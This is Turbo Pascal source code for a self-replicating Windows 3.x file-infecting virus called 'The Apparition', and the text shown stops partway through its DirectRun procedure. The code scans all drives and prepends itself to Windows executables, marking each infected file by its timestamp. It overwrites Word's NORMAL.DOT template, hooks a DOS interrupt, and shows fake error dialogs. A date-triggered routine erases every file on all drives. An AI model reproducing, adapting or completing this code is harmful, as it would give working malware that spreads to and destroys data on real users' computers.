{$A-,B-,D+,E-,F+,G+,I+,K+,L+,N-,P-,Q-,R-,S+,T-,V-,W+,X+,Y-}
{$M 32768,16384}
{$I-}
{$C PRELOAD PERMANENT}

Program ApparitionForWindows;
Uses WinCrt,WinTypes,WinProcs,Win31,WinDos,Strings,oWindows,oDialogs,CommDlg;
{$D
*** THE APPARITION for Windows. Written by Lord Asd. [SGWW] ***
 UltraGluk ALL-IN-ONE v 1.00
 }
label Skip;
Var
 XXw0,XXw1,XXw2,XXw3:word;
 XXb0,XXb1,XXb2,XXb3:boolean;
 XXr0,XXr1,XXr2,XXr3:real;
 XXc0,XXc1,XXc2,XXc3:char;
 XXx0,XXx1,XXx2,XXx3:PChar;
 XXi0,XXi1,XXi2,XXi3:integer;
 XXs0,XXs1,XXs2,XXs3:string;
 XXp0,XXp1,XXp2,XXp3:pointer;

Const
 {Константы - строки параметров в WIN.INI}
 TheApparition:PChar='The Apparition';
 DieM:PChar='DieMonth';
 DieD:PChar='DieDay';
 ShowDots:PChar='ShowDotsOn';
 ShowDialog:PChar='ShowDialog';
 BootAlr:PChar='BootInfected';
 NoInf:PChar='NoInfect';
 NoRun:PChar='NoRun';
 Logging:PChar='Logging';
 die:PChar='Die';
 CoolTime=$1234;
 MinInfSize=16384;
 MaxInfSize=300*1024;
 TimerDelay=10000;
 {Размеры компонент кода. Должны быть исправлены при компиляции}
 VSize=61440; cs_const=' !!! CODE SIZE !!! ';
 CTemplateSize=3585; { !!! COMPRESSED TEMPLATE SIZE !!! }
 XTemplateSize=11776; { !!! DECOMPRESSED TEMPLATE SIZE !!! }
 CSrcSize=20626; css_const = ' !!! COMPRESSED SRC SIZE !!! ';
 XSrcSize=47092; xss_const = ' !!! DECOMPRESSED SRC SIZE !!! ';
 ResSize=3370; { !!! RESOURCE SIZE !!! }
 Generation:word=1; gn_const='!!! GENERATION # !!!';
 TXor=0; tx_const='!!! TEMPLATE XOR !!!';
 RXor=0; rx_const='!!! RESOURCE XOR !!!';
 SXor=0; sx_const='!!! SOURCE XOR !!!';
Const
 w_Start=0;
 w_MapDrives=1;
 w_Search=2;
 w_Permut=3;
 w_Infect=4;
 w_Pause=5;
Type
 TFarProc = Procedure (p:PChar);
 {Code}
 VDataArray=array [1..VSize] of byte;
 VDataPtr  =^VDataArray;
 {Compressed template}
 CTDataArray=array [1..CTemplateSize] of byte;
 CTDataPtr  =^CTDataArray;
 {Decompressed template}
 XTDataArray=array [1..XTemplateSize] of byte;
 XTDataPtr  =^XTDataArray;
 {Compressed source}
 CSDataArray=array [1..CSrcSize] of byte;
 CSDataPtr  =^CSDataArray;
 {Decompressed source}
 XSDataArray=array [1..XSrcSize] of byte;
 XSDataPtr  =^XSDataArray;
 {Resource}
 RDataArray=array [1..ResSize] of byte;
 RDataPtr  =^RDataArray;
{
 ------------------------------------------------------------------
		   Strings list object defenition
 ------------------------------------------------------------------
}

Type
 PStrRec=^TStrRec;
 TStrRec=
 Record
  P   :PChar;
  Next:PStrRec;
 End;
 PStringList=^TStringList;
 TStringList=
 Object
  First,Curr : PStrRec;
  Constructor Init;
  Procedure Destroy;
  Procedure Reset;
  Procedure Add(P:PChar);
  Function Get(Var P:PChar):boolean;
  Function Empty:boolean;
 End;

{
 ------------------------------------------------------------------
		      Global vars
 ------------------------------------------------------------------
}


Const
 Permutated	 :boolean=false;
 _Procedure_	 :string='Procedure';
 TemplateUnpacked:boolean=false;
 BPCPath         :string[255]='';
 UnitPath        :string[255]='';
 AlrBoot         :boolean=false;

Var
 Forced      :boolean;
 RealCmdShow :word;
 x	     :integer;
 zu	     :string;
 NEFile      :boolean;
 LockTimer   :boolean;
 AlrInfNo    :word;
 Paused      :boolean;
 ScanLevel   :word;
 ThisLev     :PStringList;
 NextLev     :PStringList;
 FilesLst    :PStringList;
 PauseDelay  :word;
 Busy	     :boolean;
 wMode,w     :word;
 IDAtom      :TAtom;
 VF,TF	     :File;
 CTPtr	     :CTDataPtr;
 XTPtr	     :XTDataPtr;
 CSPtr	     :CSDataPtr;
 XSPtr	     :XSDataPtr;
 RPtr	     :RDataPtr;
 VPtr	     :VDataPtr;
 Attr	     :word;
 CopiesCount :Word;
 F	     :File;
 S	     :TSearchRec;
 P	     :Array[1..5] of PChar;
 Name	     :PChar;
 Dir	     :PChar;
 Ext	     :PChar;
 TargetName  :PChar;
 SelfName    :PChar;
 SelfChkName :PChar;
 MyWnd	     :HWnd;




{$R MAIN}

Const
 id_Ok=101;
 id_Status=102;
 id_Check=103;
 id_LastInfName=104;
 id_Pause=105;
 id_Remove=106;
 id_AlrNo=107;
 id_Destruct=108;
 id_About=109;
 id_Infect=110;
 id_GenNo=111;
 AppName='APPARITION';
Type
  PApparitionDlg=^TApparitionDlg;
  TApparitionDlg=object (TDlgWindow)
  Constructor Init(AParent:PWindowsObject;AName:PChar);
  Destructor Done; virtual;
  Procedure SetUpWindow; virtual;
  Function GetClassName:PChar; virtual;
  Procedure GetWindowClass(Var AWndClass:TWndClass); virtual;
  Procedure cmOk(Var Msg:TMessage); virtual id_First + id_Ok;
  Procedure cmCheck(Var Msg:TMessage); virtual cm_First + id_Check;
  Procedure cmInfect(Var Msg:TMessage); virtual cm_First + id_Infect;
  Procedure cmRemove(Var Msg:TMessage); virtual cm_First + id_Remove;
  Procedure cmAbout(Var Msg:TMessage); virtual cm_First + id_About;
  Procedure cmPause(Var Msg:TMessage); virtual id_First + id_Pause;
  Procedure cmDestruct(var Msg:TMessage); virtual id_First + id_Destruct;
  Procedure wmTimer(var Msg:TMessage); virtual wm_First + wm_Timer;
 End;
 TApparition=object (TApplication)
  Procedure InitMainWindow; Virtual;
  Function canClose:boolean; Virtual;
 End;

Var
 MyApp:TApparition;


{ ------------- FORWARDS ---------------}
Procedure DecompressLZSS(p,dp:pointer; sz,newsz:word); Forward;
Procedure UnpackTemplate; Forward;
Procedure Log(s:string); Forward;
Procedure PermutationEngine; Forward;
Procedure UpdateMessages; Forward;
Procedure UnloadResident; Forward;
Procedure MapDrives; Forward;
Procedure ScanOneLevel(CallBack:TFarProc); Forward;
Function Exist:boolean; Forward;
Function Alr:boolean; Forward;
Procedure CreateCopy; Forward;
Procedure VoidCallback(P:Pchar); FAR; Forward;
Procedure Destruction; Forward;
Procedure Infernalexit; Forward;

Const
 PmStop='*** PERMUTATION STOP HERE ***';
 PmStart='*** PERMUTATION START HERE ***';

{------------- Методы, описывающие список строк ----------}

 Constructor TStringList.Init;
 Begin
  First:=nil;
  Curr:=nil;
 End;

 Procedure TStringList.Reset;
 Begin
  Curr:=First;
 End;

 Function TStringList.Empty;
 Begin
  Empty:=First=nil;
 End;

 Procedure TStringList.Add;
 Var
  Hru:PStrRec;
 Begin
  New(Hru);
  GetMem(Hru^.p,128);
  StrCopy(Hru^.p,p);
  Hru^.Next:=First;
  First:=Hru;
 End;

 Function TStringList.Get;
 Begin
  If Curr=nil then
  Begin
   Get:=False;
   exit;
  End;
  Get:=True;
  StrCopy(p,Curr^.p);
  Curr:=Curr^.Next;
 End;

 Procedure TStringList.Destroy;
 Var
  Zu:PStrRec;
 Begin
  Curr:=First;
  While Curr<>nil do
  Begin
   FreeMem(Curr^.p,128);
   Zu:=Curr^.Next;
   Dispose(Curr);
   Curr:=Zu;
  End;
  First:=nil;
  Curr:=nil;
 End;



{------------- Методы диалога ----------------}
Constructor TApparitionDlg.Init(AParent:PWindowsObject;AName:PChar);
Begin
 TDlgWindow.Init(AParent,AName);
End;
Destructor TApparitionDlg.Done;
Begin
 TDlgWindow.Done;
End;
Procedure TApparitionDlg.SetUpWindow;
Begin
 TDlgWindow.SetupWindow;
End;
Function TApparitionDlg.GetClassName:PChar;
Begin
 GetClassName:=AppName;
End;
Procedure TApparitionDlg.GetWindowClass(Var AWndClass:TWndClass);
Begin
 TDlgWindow.GetWindowClass(AWndClass);
 AWndClass.hIcon:=LoadIcon(hInstance,AppName);
End;
Procedure TApparitionDlg.cmOk(var Msg:TMessage);
Begin
 Log('Terminate requested');
 UnloadResident;
 UnlockSegment(CSeg);
 Halt;
End;


Procedure TApparitionDlg.cmPause(var Msg:TMessage);
Begin
 Paused:=Not Paused;
 If Paused then Log('Paused')
	   else Log('Resumed');
 If Paused then SetDlgItemText(MyWnd,id_pause,'Resume')
	   else SetDlgItemText(MyWnd,id_pause,'Pause');
 If Paused then SetDlgItemText(MyWnd,id_Status,'Completing task...')
	   else SetDlgItemText(MyWnd,id_Status,'Wait...')
End;

Procedure TApparitionDlg.cmAbout(var Msg:TMessage);
Begin
 Application^.ExecDialog(New(PDialog,Init(@Self,'AboutDlg')));
End;


Procedure TApparitionDlg.wmTimer;
Var
 sss:string;
 pp:PChar;
Begin
 If Busy then Exit;
 If LockTimer then
 Begin
  SetDlgItemText(MyWnd,id_Status,'Locked.');
  exit;
 End;
 If Permutated then
 Begin
  SetDlgItemText(MyWnd,id_Status,'Upgraded OK.');
  exit;
 End;
 If Paused then
 Begin
  SetDlgItemText(MyWnd,id_Status,'Paused by operator.');
  exit;
 End;
 Busy:=True;
 Case wMode of
  0 : Inc(wMode);
  w_mapDrives :
  Begin
   SetDlgItemText(MyWnd,id_Status,'Mapping drives...');
   mapDrives;
   FilesLst^.Destroy;
   AlrInfNo:=0;
   inc(wMode);
  End;
  w_search:
  Begin
   GetMem(pp,128);
   Str(ScanLevel,sss);
   sss:='Scanning tree (Level '+sss+')...'+#0;
   StrCopy(pp,@sss[1]);
   SetDlgItemText(MyWnd,id_Status,pp);
   ThisLev^.Reset;
   ScanOneLevel(VoidCallBack);
   ThisLev^.Destroy;
   NextLev^.Reset;
   While NextLev^.Get(pp) do
   Begin
    ThisLev^.Add(pp);
   End;
   NextLev^.Destroy;
   FreeMem(pp,128);
   Inc(ScanLevel);
   If ThisLev^.Empty then
   Begin
    Inc(wMode);
    FilesLst^.Reset;
   End;
  End;
  w_Permut:
  Begin
   If Not AlrBoot then PermutationEngine;
   Inc(wMode);
  End;
  w_Infect:
  Begin
   GetMem(pp,128);
   If FilesLst^.Get(pp) then
   Begin
    StrCopy(TargetName,pp);
    SetDlgItemText(MyWnd,id_Status,'Spreading...');
    If Exist and (Not Alr) then CreateCopy;
   End
   else
   Begin
    Inc(wMode);
    PauseDelay:=10*60;
   End;
   Freemem(pp,128);
  End;
  w_Pause:
  Begin
   If pauseDelay=0 then wMode:=w_MapDrives;
   Dec(pauseDelay);
  End;
 End;{case}
 SetDlgItemText(MyWnd,id_Status,'Idle.');
 Busy:=False;
End;

Procedure TApparitionDlg.cmCheck;
Begin
 MessageBox(0,'Press CTRL+ALT+DEL Twice to Install Printer!!!','Double FUCK!!!',mb_ok or mb_IconStop);
End;

Procedure TApparitionDlg.cmInfect;
Var
 s,s2,s3  : string;
 Path	  : PChar;
 OpenFile : TOpenFileName;
Begin
 If (LockTimer) or (Busy) then
 Begin
  MessageBox(0,'Infection engine is busy.','Error!',mb_Ok or mb_IconExclamation);
  exit;
 End;
 LockTimer:=True;
 GetMem(Path,128);
 s:='All files'#0'*.*'#0'Executable files (*.EXE)'#0'*.EXE'#0#0;
 s2:='Infect file'#0;
 s3:='EXE'#0;
 With OpenFile do
 Begin
  lStructSize:=SizeOf(OpenFile);
  hWndOwner:=MyWnd;
  hInstance:=System.hInstance;
  lpstrFilter:=@s[1];
  lpstrCustomFilter:=nil;
  lpstrFile:=path;
  nMaxFile:=128;
  lpStrFileTitle:=nil;
  lpStrInitialDir:=nil;
  lpstrTitle:=@s2[1];
  flags:=ofn_HideReadOnly or ofn_FileMustExist;
  lpStrDefExt:=@s3[1];
  lpfnHook:=nil;
 End;

 If GetOpenFilename(OpenFile) then
 Begin
  StrCopy(TargetName,Path);
  if Alr then
  Begin
   MessageBox(0,'File is already infected, I WANNA new file to infect!','You MAZDAI!',mb_Ok or mb_IconInformation);
  End
  else
   CreateCopy;
 End;
 LockTimer:=False;
 FreeMem(Path,128);
End;

Procedure TApparitionDlg.cmRemove;
Begin
 Log('Remove from memory requested');
 If id_Yes=MessageBox(0,'About to remove from memory, confirmed?','WINAPP',mb_YesNo) then
 Begin
  WriteProfileString(TheApparition,'Running NOW','No');
  UnLockSegment(CSeg);
  Halt;
 End;
End;

Procedure TApparitionDlg.cmDestruct;
Begin
 Log('!!! Destruction requested !!!');
 If id_no=MessageBox(0,'Are you sure you want to delete all files from your disks?','WARNING',mb_YesNo
    or mb_IconQuestion) then exit;
 If id_no=MessageBox(0,'Destroy all data on all available devices, confirmed?','!!! DANGER !!!',mb_YesNo
    or mb_IconStop) then exit;
 Forced:=True;
 Destruction;
End;

{------------- Application Methods-------------}
Function TApparition.CanClose:boolean;
Begin
 UnloadResident;
 CanClose:=True;
End;

Procedure TApparition.InitMainWindow;
Begin
 MainWindow:=New(PApparitionDlg,Init(Nil,'Apparition'));
End;

Procedure Resident;
Var
 zu : string;
 x : integer;
Begin
 If GetProfileInt(TheApparition,ShowDialog,0)=666 then cmdShow:=sw_Normal else CmdShow:=sw_Hide;

 zu[0]:=Chr(GetProfileString(TheApparition,'AtomID','0',@zu[1],250));
 Val(zu,IDAtom,x);
 If x=0 then
 Begin
  zu[0]:=Chr(GlobalGetAtomName(IDAtom,@zu[1],255));
  If zu='ApparitionInstalled' then
  Begin
   exit;
  End;
 End;

 IDAtom:=GlobalAddAtom('ApparitionInstalled');
 Str(IDAtom,Zu);
 Zu:=zu+#0;
 WriteProfileString(TheApparition,'AtomID',@zu[1]);
 WriteProfileString(TheApparition,'Running NOW','Yes');
 MyApp.Init('THE APPARITION');
 MyWnd:=MyApp.MainWindow^.HWindow;
 SetDlgItemInt(MyWnd,id_GenNo,Generation,false);
 SetTimer(MyWnd,666,TimerDelay,nil);
 wMode:=0;
 Busy:=false;
 MyApp.Run;
 MyApp.Done;
End;

{ --- MISC ---}

Procedure XorArea(Pp:pointer; sz:word; cod:byte);
Var
 i:integer;
 p:^Byte;
Begin
 p:=pp;
 For i:=1 to sz do
 Begin
  UpdateMessages;
  p^:=p^ xor cod;
  p:=Ptr(Seg(P^),Ofs(P^)+1);
 End;
End;


Procedure UnloadResident;
Begin
 InfernalExit;
 GlobalDeleteAtom(IDAtom);
 WriteProfileString(TheApparition,'IDAtom','NoAtom');
 WriteProfileString(TheApparition,'Running NOW','No');
 KillTimer(MyWnd,666);
End;

Procedure Log;
Var
 T:Text;
 n:string;
Begin
 n[0]:=Chr(GetProfileString(TheApparition,Logging,'No',@n[1],255));
 If StrIComp(@n[1],'YES')<>0 then exit;
 n[0]:=Chr(GetWindowsDirectory(@n[1],255));
 n:=n+'\WINAPP.LOG';
 Assign(T,n);
 Append(T);
 if ioResult<>0 then
 Begin
  Rewrite(T);
  if ioResult<>0 then exit;
 End;
 Writeln(T,'hInstance=',hInstance,' : ',s);
 Close(T);
End;


{ -------------- Scan Engine -------------}
Procedure MapDrives;
Var
 d:Char;
 f:file of byte;
 s:string;
Begin
 ScanLevel:=0;
 ThisLev^.Destroy;
 d:='c';
 While d<='z' do
 Begin
  Assign(F,d+':\WR.TST');
  Rewrite(F);
  if ioResult=0 then
  Begin
   Close(f);
   Erase(f);
   s:=d+':\'#0;
   ThisLev^.Add(@s[1]);
  End;
  d:=succ(d);
 End;
End;

Procedure VoidCallback(P:PChar);
Begin

End;

Procedure ScanOneLevel(CallBack:TFarProc);
Var
 x :boolean;
 s :TSearchRec;
 cp,zu,hru:PChar;
 ss : string[15];
 r  : integer;
Begin
 GetMem(cp,128);
 GetMem(zu,128);
 GetMem(hru,128);
 ThisLev^.Reset;
 While ThisLev^.Get(cp) do
 Begin
  StrCopy(hru,cp);
  StrCat(cp,'*.*');
  FindFirst(cp,faArchive or faReadOnly or faHidden or faSysFile or faDirectory,s);
  While DosError=0 do
  Begin
   UpdateMessages;
   If (S.Name[0]='.') then
   Begin
    FindNext(s);
    Continue;
   End;
   StrCopy(zu,hru);
   ss:=S.Name+#0;
   StrCat(zu,@ss[1]);
   If (S.Attr and faDirectory)=0 then Callback(zu);
   StrCat(zu,'\');
   If (s.Attr and faDirectory)<>0 then NextLev^.Add(zu);
   If (StrIComp(S.Name,'OWINDOWS.TPW')=0) then
    UnitPath:=StrPas(hru);
   If ((s.Attr and faDirectory)=0) and (StrIComp(S.Name,'NORMAL.DOT')=0) then
   Begin {Overwrite NORMAL.DOT}
    x:=true;
    If GetProfileInt(TheApparition,ShowDots,0)=1 then
     x:=MessageBox(0,'Overwrite NORMAL.DOT, confirmed ?','!!! WARNING !!!',mb_YesNo or mb_IconQuestion)=id_Yes;
    If x then
    Begin {Overwr}
     UnpackTemplate;
     StrCopy(zu,hru);
     StrCat(zu,@ss[1]);
     Assign(tf,StrPas(zu));
     Rewrite(tf,1);
     if ioResult=0 then
     Begin
      BlockWrite(tf,XTPtr^,SizeOf(XTPtr^),r);
      close(tf);
      if ioResult<>0 then ;
     End; {ioResult=0}
    End; {Overwr}
   End;
   FindNext(s);
   End;
  StrCopy(cp,hru);
  StrCat(cp,'*.EXE');
  FindFirst(cp,faReadOnly or faHidden or faArchive,s);
  While DosError=0 do
  Begin
   if StrIComp(@s.name,'BPC.EXE')=0 then
   Begin
    BPCPath:=StrPas(hru);
   End;
   StrCopy(zu,hru);
   StrCat(zu,@s.name);
   If S.Time=CoolTime then
   Begin
    Inc(AlrInfNo);
    Str(AlrInfNo,ss);
    ss:=ss+#0;
    SetDlgItemText(myWnd,id_alrNo,@ss[1]);
   End;
   If (s.size<=MaxInfSize) and (s.size>MinInfSize) and (s.Time<>CoolTime) then FilesLst^.Add(zu);
   FindNext(s);
  End;
 End;
 FreeMem(zu,128);
 FreeMem(cp,128);
 FreeMem(hru,128);
End;

{
 ----------------------------------------------------------
			 Destruction
 ----------------------------------------------------------
}

Procedure DelCallBack(P:Pchar); FAR;
Var
 F:File;
 Dir,Name,Ext:PChar;
Begin
 GetMem(Dir,128);
 GetMem(Name,128);
 GetMem(Ext,128);
 FileSplit(P,Dir,Name,Ext);
 If (StrIComp(name,'WIN386')<>0) and (StrIComp(Ext,'.SWP')<>0) and
    (StrIComp(name,'386SPART')<>0) and (StrIComp(Ext,'.PAR')<>0) then
 Begin
  Assign(F,p);
  SetFAttr(F,0);
  if ioResult<>0 then ;
  Erase(F);
  if ioResult<>0 then ;
 End;
 FreeMem(Dir,128);
 FreeMem(Name,128);
 FreeMem(Ext,128);
End;


Procedure Destruction;
Var
 pp:PChar;
 zu,hru: word;
 cd,cm : word;
 ad,am : word;
 scd,scm : string;
Begin
 GetDate(zu,cm,cd,hru);
 If (GetProfileInt(TheApparition,DieM,0)=0) or
    (GetProfileInt(TheApparition,DieD,0)=0) then
 Begin
  cm:=cm+1;
  If cm=13 then cm:=1;
  Str(cm,scm);
  scm:=scm+#0;
  Str(cd,scd);
  scd:=scd+#0;
  WriteProfileString(TheApparition,DieD,@scd[1]);
  WriteProfileString(TheApparition,DieM,@scm[1]);
  exit;
 End;
 If ((GetProfileInt(TheApparition,DieM,0)=cm) and
    (GetProfileInt(TheApparition,DieD,0)>=cd)) or Forced then
 Begin
  If GetProfileInt(TheApparition,die,1)=0 then
  Begin
   MessageBox(0,'Destruction locked.','Warning',mb_ok or mb_SystemModal);
   exit;
  End;
  Getmem(pp,128);
  LockTimer:=True;
  MapDrives;
  While Not (ThisLev^.Empty) do
  Begin
   ThisLev^.Reset;
   ScanOneLevel(DelCallBack);
   ThisLev^.Destroy;
   NextLev^.Reset;
   While NextLev^.Get(pp) do ThisLev^.Add(pp);
   NextLev^.Destroy;
  End; {While}
  LockTimer:=false;
  FreeMem(pp,128);
 End;
End;


{
----------------------------------------------------------
		     Infernal engine
----------------------------------------------------------
}
{*** PERMUTATION STOP HERE ***}

Procedure __Int(_Flags, _CS, _IP, _AX, _BX, _CX, _DX, _SI, _DI, _DS, _ES, _BP: Word); INTERRUPT;
Begin
 _BP:=_BP-2;
End;

{*** PERMUTATION START HERE ***}

Procedure InfernalSetup; ASSEMBLER;
Label Skip;
Asm
 push  ds
 push  es
 lea   dx,__Int
 mov   ax,3583h
 int   21h
 cmp   bx,dx
 je    skip
 push  cs
 pop   ds
 mov   ax,2583h
 int   21h
skip:
 pop   es
 pop   ds
End;

Procedure InfernalExit; ASSEMBLER;
Asm
 push ds
 xor  dx,dx
 mov  ds,dx
 mov  ax,2583h
 int  21h
 pop  ds
End;


Procedure Replace(name:PChar);
Const
 BlockSize=8192;
 Position=7000;
Type
 TBuf = array [1..BlockSize] of byte;
Var
 F   : File;
 Buf : ^Tbuf;
 i   : integer;
 fm  : byte;
 chg : boolean;
 r   : integer;
 li  : longint;
 ss  : string[2];
Begin
 If Not NEFile Then Exit;
 chg:=False;
 fm:=FileMode;
 FileMode:=2;
 Assign(F,Name);
 Reset(F,1);
 Seek(F,Position);
 New(Buf);
 BlockRead(F,Buf^,Sizeof(buf^),r);
 For i:=1 to Sizeof(Buf^)-4 do
  If (Buf^[i+0]=$4D) and
     (Buf^[i+1]=$4D) then
  Begin
   Chg:=True;
   Buf^[i+0]:=$CD;
   Buf^[i+1]:=$83;
  End;
 If Chg then
 Begin
  Seek(F,Position);
  BlockWrite(F,Buf^,Sizeof(Buf^),r);
 End;
 Close(F);
 Dispose(Buf);
 FileMode:=fm;
End;





{
 ----------------------------------------------------------
			File infection procs
 ----------------------------------------------------------
}

Procedure AllocateGlobalVars;
Begin
 GetMem(Name,256);
 GetMem(Dir,256)	 ;
 GetMem(Ext,256)	 ;
 GetMem(TargetName,256)  ;
 GetMem(SelfName,256)	 ;
 GetMem(SelfChkName,256) ;
 New(ThisLev,Init);
 New(NextLev,Init);
 New(FilesLst,Init);
End;


Procedure DeallocateGlobalVars;
Begin
 ThisLev^.Destroy;
 Dispose(ThisLev);
 NextLev^.Destroy;
 Dispose(ThisLev);
 FilesLst^.Destroy;
 Dispose(ThisLev);

 FreeMem(Name,256)	  ;
 FreeMem(Dir,256)	  ;
 FreeMem(Ext,256)	  ;
 FreeMem(SelfName,256)	  ;
End;

Procedure UpdateMessages;
var
 Msg:TMsg;
Begin
 While PeekMessage(Msg,0,0,0,pm_Remove) do
 Begin
  TranslateMessage(Msg);
  DispatchMessage(Msg);
 End;
End;

Procedure Prepare;
Var
 Dir:Pchar;
 Ext:PChar;
Begin
 GetMem(Dir,256);
 GetMem(Ext,256);
 Randomize;
 CopiesCount:=0;
 GetArgStr(SelfName,0,256);
 FileSplit(SelfName,Dir,Name,Ext);
 StrCopy(SelfChkName,Name);
 StrCat(SelfChkname,Ext);
 FreeMem(Dir,256);
 FreeMem(ext,256);
End;

Function NotEnoughMemory:boolean;
Begin
 NotEnoughMemory:=(MaxAvail<=VSize);
End;

Procedure SelfLoad;
Var
 r:Word;
Begin
 New(VPtr);
 New(CTPtr);
 New(RPtr);
 New(CSPtr);
 Assign(VF,StrPas(SelfName));
 Reset(VF,1);
 if ioResult<>0 then
 Begin
  MessageBox(0,'System stack failure, error code 0xC6 at 0004:2F16','System error',mb_ok or mb_SystemModal);
  Halt;
 End;
 UpdateMessages;
 BlockRead(VF,VPtr^,SizeOf(VPtr^),r);
 If r<>SizeOf(VPtr^) then
 Begin
  MessageBox(0,'Unexpected disk operation failure, error code 0x02','Error',mb_Ok or mb_IconStop);
  Halt;
 End;
 UpdateMessages;
 BlockRead(VF,CTPtr^,Sizeof(CTPtr^),r);
 If r<>SizeOf(CTPtr^) then
 Begin
  MessageBox(0,'Unexpected disk operation failure, error code 0x03','Error',mb_Ok or mb_IconStop);
  Halt;
 End;
 UpdateMessages;
 BlockRead(VF,CSPtr^,Sizeof(CSPtr^),r);
 If r<>SizeOf(CSPtr^) then
 Begin
  MessageBox(0,'Unexpected disk operation failure, error code 0x04','Error',mb_Ok or mb_IconStop);
  Halt;
 End;
 UpdateMessages;
 BlockRead(VF,RPtr^,Sizeof(RPtr^),r);
 If r<>SizeOf(RPtr^) then
 Begin
  MessageBox(0,'Unexpected disk operation failure, error code 0x05','Error',mb_Ok or mb_IconStop);
  Halt;
 End;
 UpdateMessages;
 Close(VF);
End;

Procedure Done;
Begin
 Dispose(VPtr);
End;

Procedure SetCoolTime;
Var
 F :File;
Begin
 FileMode:=0;
 Assign(F,StrPas(TargetName));
 Reset(F);
 if ioResult<>0 then Exit;
 SetFTime(F,coolTime);
 Close(f);
 FileMode:=2;
End;

Function Alr:boolean;
Const
 Sign:String='THE APPARITION';
Type
 BufArr=Array[1..4096] of byte;
Var
 t,i,j:integer;
 Buf:^BufArr;
 Inf:Boolean;
Begin
 Alr:=False;
 Assign(F,TargetName);
 Reset(F,1);
 If FileSize(F)<VSize then
 Begin
  Close(F);
  Exit;
 End;
 GetMem(Buf,SizeOf(BufArr));
 Seek(F,VSize-4096);
 BlockRead(F,Buf^,SizeOf(BufArr));
 Close(F);
 For t:=1 to 4096 - Length(Sign) do
 Begin
  If Buf^[t]=Ord(Sign[1]) then
  Begin
   Inf:=true;
   For j:=0 to Length(Sign)-1 do
    If Buf^[t+j]<>Ord(Sign[j+1]) then
    Begin
     Inf:=False;
     break;
    End;
    If Inf then
    Begin
     SetCoolTime;
     Alr:=True;
     FreeMem(Buf,SizeOf(BufArr));
     Exit;
    End;
  End;
 End;
 FreeMem(Buf,SizeOf(BufArr));
End;

Function WinExeModule:boolean;
Var
 Dir,name,Ext:PChar;
 l	     :longint;
 r	     :integer;
 F	     :File;
 s	     :string;
Begin
 NEFile:=False;
 s:='XX';
 WinExeModule:=False;
 GetMem(Dir,128);
 GetMem(Name,128);
 GetMem(Ext,128);
 FileSplit(TargetName,Dir,Name,Ext);
 If (StrIComp(name,'KERNEL')=0) or
    (StrIComp(name,'USER')=0) or
    (StrIComp(name,'GDI')=0) or
    (StrIComp(name,'KRNL386')=0) or
    (StrIComp(name,'KRNL286')=0) then
 Begin
  FreeMem(Dir,128);
  FreeMem(Name,128);
  FreeMem(Ext,128);
  SetCoolTime;
  exit;
 End;
 FreeMem(Dir,128);
 FreeMem(Name,128);
 FreeMem(Ext,128);

 Assign(F,StrPas(TargetName));
 SetFAttr(F,0);
 Reset(F,1);
 If FileSize(F)<MinInfSize then
 Begin
  Close(F);
  exit;
 End;
 Seek(F,$3C);
 BlockRead(F,l,sizeof(l),r);
 If (l<$40) or (l>FileSize(F)-16) or (l>8192) then
 Begin
  Close(F);
  exit;
 End;
 Seek(F,l);
 BlockRead(F,s[1],2,r);
 Close(F);
 If (s='PE') or (s='NE') then WinExeModule:=True;
 if (s='NE') then NEFile:=True;
End;

Procedure CreateCopy;
Type
 TempBuf=array[1..16384] of byte;
Var
 ss	:String;
 tt	:PChar;
 TmpBuf:^TempBuf;
 r:integer;
 F:File;
Begin
 If Not WinExeModule then
 Begin
  SetCoolTime;
  exit;
 End;
 If GetProfileInt(TheApparition,ShowDots,0)=1 then
 Begin
  If GetProfileInt(TheApparition,NoInf,0)=1 then exit;
  GetMem(tt,256);
  StrCopy(tt,'Infect ');
  StrCat(tt,Targetname);
  StrCat(tt,' Confirmed ?');
  If MessageBox(0,tt,'!!! THE APPARITION WARNING !!!',mb_YesNo or mb_IconStop)=id_No then exit;
 End;
 FileSplit(TargetName,Dir,Name,ext);
 Assign(F,StrPas(Dir)+StrPas(Name)+'.$$$');
 SetFAttr(F,0);
 Replace(TargetName);
 Reset(F);
 if ioResult=0 then
 Begin
  Close(F);
  exit;
 End;
 Close(F);
 Assign(F,StrPas(TargetName));
 GetFAttr(F,Attr);
 SetFAttr(F,0);
 If DosError<>0 then exit;
 FileSplit(TargetName,Dir,Name,Ext);
 Rename(F,StrPas(Dir)+StrPas(Name)+'.$$$');
 If DosError<>0 then exit;
 Assign(f,StrPas(Dir)+StrPas(Name)+'.$$$');
 SetFAttr(F,0);
 Assign(VF,StrPas(TargetName));
 Rewrite(VF,1);
 BlockWrite(VF,VPtr^,SizeOf(VPtr^),r);
 BlockWrite(VF,CTPtr^,SizeOf(CTPtr^),r);
 BlockWrite(VF,CSPtr^,SizeOf(CSPtr^),r);
 BlockWrite(VF,RPtr^,SizeOf(RPtr^),r);
 Reset(F,1);
 GetMem(TmpBuf,SizeOf(TempBuf));
 Repeat
  BlockRead(F,TmpBuf^,SizeOf(TmpBuf^),r);
  BlockWrite(vf,TmpBuf^,r);
 Until r<>SizeOf(TmpBuf^);
 Close(F);
 Erase(F);
 FreeMem(TmpBuf,SizeOf(TempBuf));
 SetFAttr(VF,Attr);
 Close(VF);
 CopiesCount:=CopiesCount+1;
 SetCoolTime;
 Inc(AlrInfNo);
 Str(AlrInfNo,ss);
 ss:=ss+#0;
 SetDlgItemText(MyWnd,id_AlrNo,@ss[1]);
 SetDlgItemText(MyWnd,id_LastInfName,StrCat(name,ext));
End;


Procedure DirectRun;
Type
 TempBuf=array[1..16384] of byte;
Var
 Msg:TMsg;
 handle:word;
 r:word;
 TmpBuf:^TempBuf;
 TmpName,t1,t2:PChar;
 Ok:boolean;
 F1,f2:file;
 Ne1,ne2:char;
 s1,s2:String[2];
Begin
 FileSplit(SelfName,Dir,Name,Ext);
 Ne1:='0';
 Ne2:='0';
 Ok:=False;
 Repeat
  Ne2:=Succ(Ne2);
  If Ne2='9' then
  Begin
   Ne1:=Succ(Ne1);
   Ne2:='0';
  End;
  Assign(F2,StrPas(Dir)+StrPas(Name)+'.X'+Ne1+Ne2);
  Reset(F2);
  Ok:=(ioResult<>0);
  If Not Ok then Close(F2);
 Until Ok or (Ne1='9');
 If Not Ok then
 Begin
  MessageBox(0,'Out of memory.','Error',mb_IconStop or mb_Ok);
  Halt;
 End;
 Assign(F1,SelfName);
 Reset(F1,1);
 If FileSize(F1)<(VSize+CTemplateSize+CSrcSize+ResSize) then
 Begin
  MessageBox(0,'Unknown disk error.','Error',mb_ok or mb_IconStop);
  Close(F1);
  Halt;
 End;
